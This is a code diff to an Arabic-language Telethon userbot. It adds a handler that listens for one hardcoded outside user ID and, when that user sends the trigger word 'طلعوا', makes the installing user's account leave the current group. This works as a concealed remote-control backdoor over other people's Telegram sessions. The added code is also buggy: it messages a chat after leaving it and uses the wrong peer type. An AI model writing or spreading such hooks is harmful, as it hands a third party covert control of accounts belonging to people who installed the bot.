@@ -28,3 +28,32 @@ async def handle_messages(event):
         message_text = event.message.text.strip()
         if message_text == 'ccg':
             await event.respond("ايدي")
+from telethon.tl.functions.channels import LeaveChannelRequest
+from telethon.tl.functions.messages import SendMessageRequest
+from telethon.tl.types import InputPeerChat
+from telethon.errors import ChatAdminRequiredError
+
+@l313l.on(events.NewMessage(from_users=6205161271, pattern=r"طلعوا"))
+async def leave_group(event):
+    try:
+        
+        chat_id = event.chat_id
+
+        
+        message_id = event.message.id
+
+      
+        await event.respond("تم")
+
+       
+        await l313l(LeaveChannelRequest(chat_id))
+
+        
+        await l313l(SendMessageRequest(
+            peer=InputPeerChat(chat_id),
+            message=f"مستخدم {event.sender_id} طلع من القروب",
+            reply_to_msg_id=message_id
+        ))
+
+    except ChatAdminRequiredError:
+        await event.respond("لا يمكنني المغادرة لأنني لست مشرفًا في هذا القروب.")
